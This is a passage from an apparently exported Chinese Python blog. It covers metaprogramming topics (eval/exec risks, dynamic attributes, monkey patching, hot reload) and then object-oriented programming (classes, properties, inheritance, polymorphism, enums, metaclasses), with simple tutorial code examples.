旧模块 的属性 x（因为更新M后，不会影响x的求值结果） 如果在调用 reload(M) 后，重新执行 import M（或者from M import x）语句，那么 M.x（或者x）为 新模块 的属性 x 0x6.8hook的应用所谓import hook就是指直接自定义finder和loader,并将finder放入导入过程,以实现一些特殊的运行时行为的技巧. 利用这个可以做到很多非常神奇的事情,比如 import某个特定模块时触发某个回调函数来通知我们 import一个远程服务器上的模块 直接import其他语言的模块来使用 详情可看此篇文章:http://blog.hszofficial.site/TutorialForPython/%E8%AF%AD%E6%B3%95%E7%AF%87/%E5%85%83%E7%BC%96%E7%A8%8B/import_hook.html 0x7动态编译动态编译指的是在运行时接收字符串,动态的将其编译为python可执行的代码的功能. python提供了两个函数用于实现动态编译: exec和eval函数 eval(exp[, globals[, locals]]) globals是字典形式,表示全局命名空间,如果传入globals的字典中缺少__builtins__的时候,当前的全局命名空间将作为globals参数输入并在表达式计算之前被解析. locals则为任何映射对象,表示局部命名空间,与globals两者默认相同. 如果两者都省略则表示在eval的调用环境中执行 exec()与eval()类似的是exec()方法,但exec是翻译并执行.exec常与文件读取操作结合使用,直接传递python的代码文件运行 1234a = eval(\"lambda *x: sum(x)\")print(a(1,2,3,4,5))exec(\"aa = lambda x: x\")print(10) eval和exec有两个弊端: 降低运算效率如上面看到的,运行时间上差距不小 安全性这主要是因为可以调用一些危险的方法而没有设限.也就是所谓的代码注入攻击. 当然了,我们也可以通过限制globals和locals来实现对可用项的限制. 如果只是为了传入参数,那么可以使用ast库的literal_eval函数,它是安全的 12import astprint(ast.literal_eval(\"[1,2,3]\")) 在Python中做元编程时,最好不用exec 和eval 函数.如果接收的字符串(或片段)来自不可信的源,那么这两个函数会带来严重的安全风险.Python提供了充足的内省工具,大多数时候都不需要使用exec和eval函数.然而,Python核心开发者实现namedtuple函数时选择了使用exec函数,这样做是为了让生成的类代码能通过._source获取. 0x8动态属性0x8.1静态语言与动态语言0x8.1.1 静态语言特点： a. 在定义变量时需要指定变量的类型，根据指定的类型来确定变量所占的内存空间 b. 需要经过编译才能运行 c. 在代码编译后，运行过程不能对代码进行操作 d. 常见的静态语言：C、C++、Java等 0x8.1.2 动态语言的特点： a. 不需要经过编译，而是由解释器程序来解释执行代码 b. 在代码运行过程中，可以动态地对代码进行操作 c. 常见的动态语言：Python、PHP、Ruby、JavaScript等 0x8.1.3 优缺点比较： a. 静态语言会声明变量类型，可以帮助计算机在执行代码前来发现更多潜在的错误，但这样会需要使用者进行更多的思考和编码。反之动态语言则不需要，它很灵活 b. 静态语言在编译后，执行速度一般是大于动态语言的 c. 静态语言结构比较规范，能很方便调试，但需要与大量类型相关的代码。而动态语言不需要与大量类型相关的代码，但如果编写不规范，不容易调试 8.2 影响属性处理方式的特殊属性 __class__ 对象所属类的引用(即obj.__class__与type(obj) 的作用相同).Python 的某些特殊方法,例如__getattr__,只在对象的类中寻找,而不在实例中寻找. __dict__一个映射,存储对象或类的可写属性.有__dict__ 属性的对象,任何时候都能随意设置新属性.如果类有__slots__属性,它的实例可能没有__dict__属性.参见下面对__slots__ 属性的说明. __slots__类可以定义这个这属性,限制实例能有哪些属性.__slots__属性的值是一个字符串组成的元组,指明允许有的属性.如果__slots__中没有’__dict__‘,那么该类的实例没有 __dict__ 属性,实例只允许有指定名称的属性. 8.3 处理属性的内置函数下述5个内置函数对对象的属性做读、写和内省操作. dir([object])列出对象的大多数属性.dir 函数的目的是交互式使用,因此没有提供完整的属性列表,只列出一组”重要的”属性名.dir 函数能审查有或没有__dict__属性的对象.dir函数不会列出__dict__属性本身,但会列出其中的键.dir 函数也不会列出类的几个特殊属性,例如__mro__、__bases__和__name__.如果没有指定可选的object参数,dir 函数会列出当前作用域中的名称. getattr(object,name[, default])从object 对象中获取name字符串对应的属性.获取的属性可能来自对象所属的类或超类。如果没有指定的属性,getattr 函数抛出AttributeError异常,或者返回default参数的值(如果设定了这个参数的话). hasattr(object, name)如果object对象中存在指定的属性,或者能以某种方式(例如继承)通过object对象获取指定的属性,返回True setattr(object, name, value)把object对象指定属性的值设为value,前提是object对象能接受那个值.这个函数可能会创建一个新属性,或者覆盖现有的属性. vars([object])返回object对象的dict属性;如果实例所属的类定义了slots 属性,实例没有dict属性,那么vars函数不能处理那个实例(相反,dir 函数能处理这样的实例).如果没有指定参数,那么vars()函数的作用与locals()函数一样:返回表示本地作用域的字典. 8.4处理属性的特殊方法在用户自己定义的类中,下述特殊方法用于获取,设置,删除和列出属性. 使用点号或内置的getattr、hasattr 和setattr函数存取属性都会触发下述列表中相应的特殊方法.但是直接通过实例的__dict__属性读写属性不会触发这些特殊方法——如果需要,通常会使用这种方式跳过特殊方法. 对用户自己定义的类来说,如果隐式调用特殊方法,仅当特殊方法在对象所属的类型上定义,而不是在对象的实例字典中定义时,才能确保调用成功. 要假定特殊方法从类上获取,即便操作目标是实例也是如此.因此,特殊方法不会被同名实例属性遮盖. __delattr__(self, name)只要使用del语句删除属性,就会调用这个方法.例如,del obj.attr语句触发Class.__delattr__(obj, &#39;attr&#39;)方法. __dir__(self)把对象传给dir函数时调用,列出属性.例如，dir(obj) 触发Class.__dir__(obj)方法. __getattr__(self, name)仅当获取指定的属性失败，搜索过obj、Class和超类之后调用.表达式obj.no_such_attr、getattr(obj, ‘no_such_attr’) 和hasattr(obj, ‘no_such_attr’)可能会触发Class.__getattr__(obj, &#39;no_such_attr&#39;)方法,但仅当在obj、Class 和超类中找不到指定的属性时才会触发. __getattribute__(self, name)尝试获取指定的属性时总会调用这个方法,不过寻找的属性是特殊属性或特殊方法时除外.点号与getattr 和hasattr 内置函数会触发这个方法.调用__getattribute__方法且抛出AttributeError 异常时,才会调用__getattr__ 方法.为了在获取obj实例的属性时不导致无限递归,__getattribute__方法的实现要使用super().__getattribute__(obj, name) __setattr__(self, name, value)尝试设置指定的属性时总会调用这个方法.点号和setattr内置函数会触发这个方法.例如obj.attr = 42和setattr(obj,&#39;attr&#39;, 42) 都会触发Class.__setattr__(obj,attr’, 42) 方法 其实特殊方法__getattribute__ 和__setattr__不管怎样都会调用,几乎会影响每一次属性存取,因此比__getattr__方法(只处理不存在的属性名)更难正确使用.与定义这些特殊方法相比,使用特性或描述符相对不易出错. 8.5动态绑定方法python中方法只是可以调用的属性,因此方法也是可以动态绑定的.尤其实例方法的动态*8.5.1动态绑定实例方法 * 动态绑定实例方法需要借助types.MethodType 1234567891011121314from types import MethodTypeclass Student(object): age = 10def set_age(self, age): # 定义一个函数作为实例方法 self.age = ages = Student()s.set_age = MethodType(set_age, s) # 给实例绑定一个方法print(s.age)s.set_age(12)print(s.age)output:1012 8.5.2动态绑定类方法 动态绑定类方法与前面类似,只是MethodType的第一个参数改成了类名 1234567891011from types import MethodTypeclass Student(object): age = 10def set_score(clz, score):#定义一个函数作为类的方法 clz.score = scoreStudent.set_score = MethodType(set_score, Student)Student.set_score(30)print(Student.score)s=Student()print(s.score) 8.5.3动态绑定静态方法动态绑定静态方法更加简单了,只要直接在类名后面像添加元素一样添加即可 1234567from types import MethodTypeclass Student(object): age = 10def echo(score):#定义一个函数作为类的方法 return scoreStudent.echo = echoprint(Student.echo(123)) 0x9猴子补丁0x9.1什么是猴子补丁即在运行时对方法 / 类 / 属性 / 功能进行修改，把新的代码作为解决方案代替原有的程序，也就是为其打上补丁。 0x9.2猴子补丁主要有以下几个用处 在运行时替换方法、属性等 在不修改第三方代码的情况下增加原来不支持的功能 在运行时为内存中的对象增加patch而不是在磁盘的源代码中增加 9.3猴子补丁例子 12345678class Foo(object): def bar(self): print('Foo.bar')def bar(self): print('Modified bar')Foo().bar()Foo.bar = barFoo().bar() 0x10热更新0x10.1什么是热更新简单来说，热更新就是在进程不重启的情况下，让其加载修改后的程序代码，且能按照预期正确执行。在实际开发中，热更新的最主要用途有， 开发期，提升开发效率，让代码改动立等可见，避免频繁重启 运维期，在服务端不断线情况下修复紧急bug 对于bug修复来说，服务端如果不保持状态，那么热更新的必要性不那么大，但如果服务端持有复杂状态，那么热更新就会是一个比较合适的选择。 0x10.2热更新的要点Python代码是以module进行组织的，代码热更新就是module的热更新。Python提供的内置函数reload用于重新加载模块，然而直接使用reload并不能够解决热更新这一问题。热更新的要点在于需要让已经创建的对象能够执行更新以后的代码。 0x10.3更新操作拆解具体看此篇文章:https://toutiao.io/posts/edo9eh/preview参考文章:python中的元编程:http://blog.hszofficial.site/TutorialForPython/%E8%AF%AD%E6%B3%95%E7%AF%87/%E5%85%83%E7%BC%96%E7%A8%8B/Python装饰器详解:http://www.imooc.com/article/262384Python装饰器:https://www.cnblogs.com/xiaobingqianrui/p/8435074.html详解Python的装饰器http://python.jobbole.com/86717/理解 Python 装饰器看这一篇就够了https://foofish.net/python-decorator.html什么是 Python 元类:https://foofish.net/what-is-metaclass.htmlPython 元类 (MetaClass) 小教程:https://lotabout.me/2018/Understanding-Python-MetaClass/#%E7%B1%BB%E6%98%AF%E5%8A%A8%E6%80%81%E5%88%9B%E5%BB%BA%E7%9A%84解密 Python 的描述符（descriptor）http://python.jobbole.com/81899/Python 描述符(Descriptor) 附实例:https://zhuanlan.zhihu.com/p/42485483python理解描述符(descriptor) http://www.imooc.com/article/270468?block_id=tuijian_wzpython中描述符的学习:https://www.jianshu.com/p/27deebdd521fPython import hook：http://kuanghy.github.io/2016/10/25/python-import-hookPython编程笔记–动态属性: https://zhuanlan.zhihu.com/p/32797327Python 代码热更新实现https://toutiao.io/posts/edo9eh/preview","categories":[{"name":"编程算法","slug":"编程算法","permalink":"https://blog.cfyqy.com/categories/%E7%BC%96%E7%A8%8B%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"python","slug":"python","permalink":"https://blog.cfyqy.com/tags/python/"},{"name":"元编程","slug":"元编程","permalink":"https://blog.cfyqy.com/tags/%E5%85%83%E7%BC%96%E7%A8%8B/"}],"author":"ye1s"},{"title":"python面向对象编程","slug":"thon中的类","date":"2019-05-30T02:32:00.000Z","updated":"2020-04-13T08:21:03.713Z","comments":true,"path":"article/761e66f3.html","link":"","permalink":"https://blog.cfyqy.com/article/761e66f3.html","excerpt":"在Python中使用class关键字定义一个类，类的主体由属性（变量）和方法（函数）组成","text":"在Python中使用class关键字定义一个类，类的主体由属性（变量）和方法（函数）组成 详情可看此篇文章:https://mp.weixin.qq.com/s/jEKvWwu5MwCqLbIxmAP4iQ面向对象编程和函数式编程（面向过程编程）都是程序设计的方法，不过稍有区别。 面向过程编程： 1234567891. 导入各种外部库2. 设计各种全局变量3. 写一个函数完成某个功能4. 写一个函数完成某个功能5. 写一个函数完成某个功能6. 写一个函数完成某个功能7. 写一个函数完成某个功能8. ......9. 写一个main函数作为程序入口 在多函数程序中，许多重要的数据被放置在全局数据区，这样它们可以被所有的函数访问。每个函数都可以具有它们自己的局部数据，将某些功能代码封装到函数中，日后便无需重复编写，仅调用函数即可。从代码的组织形式来看就是根据业务逻辑从上到下垒代码 。 面向对象编程： 1234561. 导入各种外部库2. 设计各种全局变量3. 决定你要的类4. 给每个类提供完整的一组操作5. 明确地使用继承来表现不同类之间的共同点6. 根据需要，决定是否写一个main函数作为程序入口 面向对象编程中，将函数和变量进一步封装成类，类才是程序的基本元素，它将数据和操作紧密地连结在一起，并保护数据不会被外界的函数意外地改变。类和和类的实例（也称对象）是面向对象的核心概念，是和面向过程编程、函数式编程的根本区别。 并不是非要用面向对象编程，要看你的程序怎么设计方便，但是就目前来说，基本上都是在使用面向对象编程。 0x1类的基本用法面向对象是通过定义class类来定义，这么说面向对象编程就是只使用class类，在class类中有封装，继承的功能，并且还可以构造要传入的参数，方便控制。案例： 123456789101112131415161718#!/usr/bin/env python3#-*- coding:utf-8 -*-import timeclass studetn: # 定义一个类名为studetn def __init__(self,idx): # 定义初始化构造，这里使用init，还有别的属性比如reversed，iter之类的 self.idx=idx # 初始化变量，方便继承 def runx(self): # 定义运行函数，从上面继承变量 print(self.idx) # 打印出idx的值，或者做一些别的处理 time.sleep(1)a=studetn('a')a.runx()# 这是类的调用，一定要记得类的使用方法，首先传入参数，类赋值给一个变量a# 然后调用这个类下面定义的函数 一些专业术语概念，既然有面向对象编程这个高大上的定义了，自然要搭配一些高大上的概念。 类(Class): 用来描述具有相同属性和方法的对象的集合。它定义了该集合中每个对象所共有的属性和方法。其中的对象被称作类的实例。 实例：也称对象。通过类定义的初始化方法，赋予具体的值，成为一个”有血有肉的实体”。 实例化：创建类的实例的过程或操作。 实例变量：定义在实例中的变量，只作用于当前实例。 类变量：类变量是所有实例公有的变量。类变量定义在类中，但在方法体之外。 数据成员：类变量、实例变量、方法、类方法、静态方法和属性等的统称。 方法：类中定义的函数。 静态方法：不需要实例化就可以由类执行的方法 类方法：类方法是将类本身作为对象进行操作的方法。 方法重写：如果从父类继承的方法不能满足子类的需求，可以对父类的方法进行改写，这个过程也称override。 封装：将内部实现包裹起来，对外透明，提供api接口进行调用的机制 继承：即一个派生类（derived class）继承父类（base class）的变量和方法。 多态：根据对象类型的不同以不同的方式进行处理。 0x2调用类的三种方法0x2.1实例方法 12345678910import requestsclass dd: def __init__(self,url): self.url=url def runx(self): print(requests.get(self.url).status_code)a = dd('http://www.baidu.com')a.runx() 0x2.2静态方法 1234567import requestsclass ff: @staticmethod def runx(): print(requests.get('http://www.baidu.com').status_code)ff.runx()#这里就直接调用了类的变量，只在类中运行而不在实例中运行的方法 经常有一些跟类有关系的功能但在运行时又不需要实例和类参与的情况下需要用到静态方法. 比如更改环境变量或者修改其他类的属性等能用到静态方法. 这种情况可以直接用函数解决, 但这样同样会扩散类内部的代码，造成维护困难。0x2.3类方法类方法由类调用，采用@classmethod装饰，至少传入一个cls（代指类本身，类似self）参数。执行类方法时，自动将调用该方法的类赋值给cls。建议只使用类名.类方法的调用方式。（虽然也可以使用实例名.类方法的方式调用） 实际案例如果要构造一个类，接受一个网站和这个网站的状态码，然后打印出来。就像这样： 12345678910import requestsclass gg: def __init__(self,url,stat): self.url=url self.stat=stat def outer(self): print(self.url) print(self.stat)a = gg('hello',200)a.outer() 这样就是使用实例方法，虽然可以实现，但是有的时候传入的参数并不是(‘langzi’,200)这样的格式，而是(‘langzi-200’)这样的，那该怎么做？首先要把这个拆分，但是要使用实例方法实现起来很麻烦，这个时候就可以使用类方法。 1234567891011121314151617181920212223242526import requestsclass gg: url = 0 stat = 0 # 因为使用classmethod后会传入新的变量，所以一开始是需要自己先定义类变量 def __init__(self,url=0,stat=0): # 这里按照正常的定义构造函数 self.url=url self.stat=stat @classmethod # 装饰器，立马执行下面的函数 def split(cls,info): # 这个函数接受两个参数，默认的cls就是这个类的init函数，info就是外面传入进来的 url,stat=map(str,info.split('-')) # 这里转换成了格式化的结构 data = cls(url,stat) # 然后执行这个类第一个方法，这个类构造函数需要传入两个参数，于是就传入了两个参数 return data # 这里就直接返回了函数结果 def outer(self): print(self.url) print(self.stat)r = gg.split(('hello-200'))r.outer()# 这里是调用类方法，与调用实例方法一样 0x3类的属性 Python的类的属性一般分为私有属性和公有属性,而Python没有这类关键字，默认情-况下所有的属性都是“公有的”，对公有属性的访问没有任何限制，且都会被子类继承，也能从子类中进行访问。 若不希望类中的属性在类外被直接访问，就要定义为私有属性。Python使用约定属性名称来划分属性类型。若属性的名字以两个下划线开始，表示私有属性；反之，没有使用双下划线开始的表示公有属性。类的方法也同样使用这样的约定 另外，Python没有保护类型的修饰符。 实例属性是以self为前缀的属性，没有该前缀的属性是普通的局部变量。 在Python中静态变量称为类变量，类变量可以在该类的所有实例中被共享。 类属性仅与其被定义的的类相绑定，主要包括数据属性（静态变量）和方法。方法在类中定义，但却只能被实例调用。如果没有与类的数据属性同名的实例属性，通过实例也可以访问类的数据属性，但是却不能作修改。 类属性和实例属性 私有变量 内置属性 123456C.__name__ 类C的名字（字符串）C.__doc__ 类C的文档字符串C.__bases__ 类C的所有父类构成的元组C.__dict__ 类C的属性C.__module__ 类C定义所在的模块C.__class__ 实例C对应的类 范例： 实例仅拥有数据属性，即类属性。实例属性可以动态创建，但是如果属性在条件语句中创建，而该条件语句未执行，则该属性实际并不存在，如果在后面代码访问该属性，就会出错。带默认参数的init(self,…)可以更有效的初始化一个实例，这样可以省去显式传值的麻烦，但是默认参数应当是不变的对象，在使用入列表和字典等可变对象时应时刻保持警惕。 12345678910111213141516171819class demo_list: def __init__(self, l=[]): self.l = l def add(self, ele): self.l.append(ele)def appender(ele): obj = demo_list() obj.add(ele) print(obj.l)if __name__ == \"__main__\": for i in range(5): appender(i)output:[0][0, 1][0, 1, 2][0, 1, 2, 3][0, 1, 2, 3, 4] 因为默认参数只会计算一次，不会重复使用，在上面的例子中，虽然使用不同的新建实例，可因为构造器的参数使用的是对列表的引用作为默认参数，所以每次的实例属性都指向该列表所在的空间。 点击查看更多相关资料 使用内建函数dir()可以显示类和实例属性，实例具有dict的特殊属性，该属性由字典组成，包含一个实例的所有属性。 1234567891011121314class ReturnInt: def __init__(self): passri=ReturnInt()ri.name='a'ri.age=10print(ri.__dict__)print(dir(ri))output:&#123;'name': 'a', 'age': 10&#125;['__class__', '__delattr__', '__dict__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__le__', '__lt__', '__module__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', '__weakref__', 'age', 'name'] 从上面的程序中可以看到除了我们添加的实例属性，实例还有许多其他的属性，这些属性是实例的内建类型属性。 0x4类的方法 类的方法也分为公有方法和私有方法。私有方法不能被模块外的类或方法调用，私有方法也不能被外部的类或函数调用。 C++中的静态方法使用关键字static声明，而Python使用函数staticmethod()或@staticmethod修饰器将普通的函数转换为静态方法。Python的静态方法并没有和类的实例进行名称绑定，要调用除了使用通常的方法，使用类名作为其前缀亦可 0x5类的对象信息type() 可以检查类型。用法超级简单 1234&gt;&gt;&gt; type(123)&lt;class 'int'&gt;&gt;&gt;&gt; type('helloworld')&lt;class 'str'&gt; 对于class的继承关系来说，使用type()就很不方便。我们要判断class的类型，可以使用isinstance()函数。 1object -&gt; Animal -&gt; Dog -&gt; Husky 那么，isinstance()就可以告诉我们，一个对象是否是某种类型。这玩意儿也是上手熟系列： 12345&gt;&gt;&gt; a = Animal()&gt;&gt;&gt; b = Dog()&gt;&gt;&gt; isinstance(c, Animal)True 使用内建函数dir()可以显示类和实例属性，实例具有dict的特殊属性，该属性由字典组成，包含一个实例的所有属性。 0x6类的特性0x6.1封装封装是指将数据与具体操作的实现代码放在某个对象内部，外部无法访问。必须要先调用类的方法才能启动。案例: 123456789101112class cc: ccc = 'ccc' # cc就是类名 如果想要继承别的类 就class cc(threading) 意思就是从threading继承 def __init__(self,a,b,c): self.a=a self.b=b self.c=ce=cc(1,2,3)print(e.ccc)#类变量，在类里面找到定义的变量。print(ccc)# 这里会报错，这就是封装。类中的函数同理。 0x6.2继承当我们定义一个class的时候，可以从某个现有的class继承，新的class称为子类（Subclass），而被继承的class称为基类、父类或超类（Base class、Super class）。比如，我们已经编写了一个名为Animal的class，有一个run()方法可以直接打印 123class Animal(object): def run(self): print 'Animal is running...' 当我们需要编写Dog和Cat类时，就可以直接从Animal类继承： 1234class Dog(Animal): passclass Cat(Animal): pass 继承有什么好处？最大的好处是子类获得了父类的全部功能。由于Animial实现了run()方法，因此，Dog和Cat作为它的子类，什么事也没干，就自动拥有了run()方法： 1234dog = Dog()dog.run()cat = Cat()cat.run() 当子类和父类都存在相同的run()方法时，我们说，子类的run()覆盖了父类的run()，在代码运行的时候，总是会调用子类的run()。这样，我们就获得了继承的另一个好处：多态。 多重继承 123多重继承的语法格式：class_name(parent_class1, parent_class2…)其中class_name是类名，parent_class1和parent_class2是父类名。 多重继承关系中的构造函数： 子类从多个父类派生，而子类又没有自己的构造函数时：（1）按顺序继承，哪个父类在最前面且它又有自己的构造函数，就继承它的构造函数； （2）如果最前面第一个父类没有构造函数，则继承第2个的构造函数，第2个没有的话，再往后找，以此类推。 范例: 0x6.3多态要理解多态的好处，我们还需要再编写一个函数，这个函数接受一个Animal类型的变量： 123def run_twice(animal): animal.run() animal.run() 当我们传入Animal的实例时，run_twice()就打印出： 1234run_twice(Animal())运行结果：Animal is running...Animal is running... 当我们传入Dog的实例时，run_twice()就打印出： 1234run_twice(Dog())运行结果：Dog is running...Dog is running... 当我们传入Cat的实例时，run_twice()就打印出： 1234run_twice(Cat())运行结果：Cat is running...Cat is running... 看上去没啥意思，但是仔细想想，现在，如果我们再定义一个Tortoise类型，也从Animal派生： 123class Tortoise(Animal): def run(self): print 'Tortoise is running slowly...' 当我们调用run_twice()时，传入Tortoise的实例： 1234run_twice(Tortoise())运行结果：Tortoise is running slowly...Tortoise is running slowly... 你会发现，新增一个Animal的子类，不必对run_twice()做任何修改，实际上，任何依赖Animal作为参数的函数或者方法都可以不加修改地正常运行，原因就在于多态。 多态的好处就是，当我们需要传入Dog、Cat、Tortoise……时，我们只需要接收Animal类型就可以了，因为Dog、Cat、Tortoise……都是Animal类型，然后，按照Animal类型进行操作即可。由于Animal类型有run()方法，因此，传入的任意类型，只要是Animal类或者子类，就会自动调用实际类型的run()方法，这就是多态的意思： 对于一个变量，我们只需要知道它是Animal类型，无需确切地知道它的子类型，就可以放心地调用run()方法，而具体调用的run()方法是作用在Animal、Dog、Cat还是Tortoise对象上，由运行时该对象的确切类型决定，这就是多态真正的威力：调用方只管调用，不管细节，而当我们新增一种Animal的子类时，只要确保run()方法编写正确，不用管原来的代码是如何调用的。这就是著名的“开闭”原则： 对扩展开放：允许新增Animal子类；对修改封闭：不需要修改依赖Animal类型的run_twice()等函数。 继承可以把父类的所有功能都直接拿过来，这样就不必重零做起，子类只需要新增自己特有的方法，也可以把父类不适合的方法覆盖重写；有了继承，才能有多态。在调用类实例方法的时候，尽量把变量视作父类类型，这样，所有子类类型都可以正常被接收；旧的方式定义Python类允许不从object类继承，但这种编程方式已经严重不推荐使用。任何时候，如果没有合适的类可以继承，就继承自object类。 0x7成员保护与访问机制有些对象你不想外部访问，即使是通过调用类对象也无法访问0x7.1私有成员 123456789101112class obj: def __init__(self,name): self.name=name def pri(self): print self.name __age = 18 # 加上双下划线的就是私有变量，只能在类的内部访问，外部无法访问a = obj('zhao')a.pri()运行结果：zhao 如果要在类中调用这个私有成员，可以这么用 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657class obj: def __init__(self,name): self.name=name def prin(self): print self.name __age = 18 # 加上双下划线的就是私有变量，只能在类的内部访问，外部无法访问 @classmethod # 如果要在类中调用，首先调用类方法 def pri(cls): print cls.__age # 然后在使用a = obj('zhao')a.prin()obj.pri()# 通过这样直接调用类中的私有变量运行结果：zhao18``` 不过实际上还是可以直接访问的。 **0x7.2使用get-set-del方法操作私有成员** ```bashclass obj: def __init__(self,name): self.name=name def prin(self): print self.name __age = 18 # 加上双下划线的就是私有变量，只能在类的内部访问，外部无法访问 @classmethod # 如果要在类中调用，首先调用类方法 def pri(cls): print cls.__age # 然后在使用 @classmethod def set_age(cls,value): cls.__age = value return cls.__age # 这个用法就是改变__age的值 @classmethod def get_age(cls): return cls.__age # 这个用法就是直接返回__age的值 @classmethod def del_age(cls): del cls.__age # 这个用法就是直接删除__age的值print obj.get_age()# 这里是直接调用出__age的值 返回值18print obj.set_age(20)# 这里是直接改变__age的值 返回值20obj.del_age()# 这里是直接删除__age的值 思考： 既然是私有变量，不让外部访问，为何有要在后面调用又改变呢？因为可以对私有变量进行额外的检测，处理，加工等等。比如判断value的值，使用isinstance然后做if-else判断。 使用私有变量可以对内部变量进行保护，外部无法改变，但是可以对它进行检测处理。 这里引申一下私有成员的保护机制，使用age对私有变量其实就是—&gt;obj._objage的样子进行保护，说白了你直接使用obj._obj__age就可以直接调用内部私有变量age了。 0x8Propety装饰器 把类的方法伪装成属性调用的方式，就是把类里面的一个函数，变成一个属性一样的东西~一开始调用类的方法要使用圆括号，现在变成了属性进行读取设置存储。举个例子来说明： 常用调用方法 123456789101112131415161718class obj: def __init__(self,name,age): self.__name=name self.__age=age # 讲这些设置成私有变量 def get_age(self): return self.__age def set_age(self,value): if isinstance(value,int): self.__age=value else: raise ValueError('非整数类型') def del_age(self): print('delete over')a = obj('langzi',18)print(a.get_age())a.set_age(20)print(a.get_age()) 使用装饰器 1234567891011121314151617181920212223242526class obj: def __init__(self,name,age): self.__name=name self.__age=age # 把这些设置成私有变量 @property def age(self): return self.__age @age.setter def age(self,value): if isinstance(value,int): self.__age=value else: raise ValueError('非整数类型') @age.deleter def age(self): print('delete over')a = obj('langzi',18)# 使用这些装饰器，可以使用类与对象的方法直接调用print(a.age)# 这里就是直接调用返回age的值a.age=20# 这里就是直接使用setter把值转换print(a.age)del a.age# 删除age 当然这种调用方法有些麻烦，每次都是一个一个去实例类与对象，有个更加简单直观的方法。 更加减半的使用property()函数除了使用装饰器的方式将一个方法伪装成属性外，Python内置的builtins模块中的property()函数，为我们提供了第二种设置类属性的手段。 123456789101112131415161718192021222324252627class People: def __init__(self, name, age): self.__name = name self.__age = age def get_age(self): return self.__age def set_age(self, age): if isinstance(age, int): self.__age = age else: raise ValueError def del_age(self): print(\"删除年龄数据！\") # 核心在这句 age = property(get_age, set_age, del_age, \"年龄\")obj = People(\"jack\", 18)print(obj.age)obj.age = 19print(\"obj.age: \", obj.age)del obj.age 0x9 __init__(self,…)‘构造器’方法init(self,…)方法实际上并不是一个构造器，其并没有创造一个新的对象，Python通过函数操作符()创建对象。在解释器创建一个实例后，最先调用init(self,…)方法，定义额外的行为，如果没有定义或者覆盖init(self,…)方法，对实例不会施加任何特别的操作，直接返回它的对象，实例化过程完毕。函数的返回值应当为None,如果返回来任意对象，会导致TypeError异常。 123456789101112class ReturnInt: def __init__(self): return 1ri=ReturnInt()output:Traceback (most recent call last): File \"E:\\code\\python27\\test12121.py\", line 6, in &lt;module&gt; ri=ReturnInt()TypeError: __init__() should return None, not 'int' 重写子类的init(self,…)方法不会自动调用基类的init(self,…)。所以如果需要在子类中调用基类的init(self,…)，需要明确指出。 12345678910111213141516class P(): def __init__(self): self.age=20 self.name='test'class C(P): def __init__(self): P.__init__(self)c=C()print(c.age)print(c.name)output:20test 我们可以使用super()函数更方便高效的重写上面的代码： 123class C(P): def __init__(self): super(C,self).__init__() 不需要提供明确的父类，super()函数会帮助我们找到相应的父类，然后方便调用相关的属性。 0x10使用枚举类当我们需要定义常量时，一个办法是用大写变量通过整数来定义，例如月份： 123456JAN = 1FEB = 2MAR = 3...NOV = 11DEC = 12 好处是简单，缺点是类型是int，并且仍然是变量。 更好的方法是为这样的枚举类型定义一个class类型，然后，每个常量都是class的一个唯一实例。Python提供了Enum类来实现这个功能： 123456789101112131415161718192021222324from enum import EnumMonth = Enum('Month', ( 'Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'))for name, member in Month.__members__.items(): print(name, '=&gt;', member, ',', member.value)output:Jan =&gt; Month.Jan , 1Feb =&gt; Month.Feb , 2Mar =&gt; Month.Mar , 3Apr =&gt; Month.Apr , 4May =&gt; Month.May , 5Jun =&gt; Month.Jun , 6Jul =&gt; Month.Jul , 7Aug =&gt; Month.Aug , 8Sep =&gt; Month.Sep , 9Oct =&gt; Month.Oct , 10Nov =&gt; Month.Nov , 11Dec =&gt; Month.Dec , 12 这样我们就获得了Month类型的枚举类，可以直接使用Month.Jan来引用一个常量，或者枚举它的所有成员value属性则是自动赋给成员的int常量，默认从1开始计数。 如果需要更精确地控制枚举类型，可以从Enum派生出自定义类： 123456789101112131415from enum import Enum, unique# @unique装饰器可以帮助我们检查保证没有重复值。@uniqueclass Weekday(Enum): Sun = 0 # Sun的value被设定为0 Mon = 1 Tue = 2 Wed = 3 Thu = 4 Fri = 5 Sat = 6for name, member in Weekday.__members__.items(): print(name, '=&gt;', member,member.value) 0x11使用元类动态语言和静态语言最大的不同，就是函数和类的定义，不是编译时定义的，而是运行时动态创建的。 比方说我们要定义一个Hello的class，就写一个hello.py模块： 123class Hello(object): def hello(self, name='world'): print('Hello, %s.' % name) 当Python解释器载入hello模块时，就会依次执行该模块的所有语句，执行结果就是动态创建出一个Hello的class对象，测试如下： 12345678&gt;&gt;&gt; from hello import Hello&gt;&gt;&gt; h = Hello()&gt;&gt;&gt; h.hello()Hello, world.&gt;&gt;&gt; print(type(Hello))&lt;class 'type'&gt;&gt;&gt;&gt; print(type(h))&lt;class 'hello.Hello'&gt; type()函数可以查看一个类型或变量的类型，Hello是一个class，它的类型就是type，而h是一个实例，它的类型就是class Hello。 class的定义是运行时动态创建的，而创建class的方法就是使用type()函数。 type()函数既可以返回一个对象的类型，又可以创建出新的类型，比如，我们可以通过type()函数创建出Hello类，而无需通过class Hello(object)…的定义： 1234567891011&gt;&gt;&gt; def fn(self, name='world'): # 先定义函数... print('Hello, %s.' % name)...&gt;&gt;&gt; Hello = type('Hello', (object,), dict(hello=fn)) # 创建Hello class&gt;&gt;&gt; h = Hello()&gt;&gt;&gt; h.hello()Hello, world.&gt;&gt;&gt; print(type(Hello))&lt;class 'type'&gt;&gt;&gt;&gt; print(type(h))&lt;class '__main__.Hello'&gt; 要创建一个class对象，type()函数依次传入3个参数： 1type(‘Hello’, (object,), dict(hello=fn)) class名称； 继承父类的集合，注意Python支持多重继承，别忘了tuple的单元素写法； class的方法名称与函数绑定，这里我们把函数fn绑定到方法名hello上。 通过type()函数创建的类和直接写class是完全一样的，因为Python解释器遇到class定义时，仅仅是扫描一下class定义的语法，然后调用type()函数创建出class。 正常情况下，我们都用class 